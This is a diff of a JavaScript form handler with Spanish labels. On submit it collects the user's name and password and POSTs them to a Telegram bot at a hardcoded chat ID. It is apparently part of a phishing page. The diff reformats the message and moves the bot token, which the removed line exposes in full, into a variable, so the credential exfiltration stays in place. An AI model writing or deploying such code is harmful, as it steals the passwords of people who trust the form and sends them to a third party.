@@ -17,18 +17,12 @@ formulario.addEventListener('submit', async (e) => {
     const CHAT_ID = "6719366535"; 
 
     // Mensaje a enviar
-    const mensaje = `
-        🚀 Nuevo Registro:
-        👤 Usuario: ${usuario}
-        🔑 Contraseña: ${contraseña}
-    `;
+    const mensaje = `🚀 *Nuevo Registro:*\n👤 *Usuario:* ${usuario}\n🔑 *Contraseña:* ${contraseña}`;
 
     try {
-        const response = await fetch(`https://api.telegram.org/bot${8168160200:AAG8L_5th20MDegla-7VVHJImDFJynwWLBM}/sendMessage`, {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: mensaje,
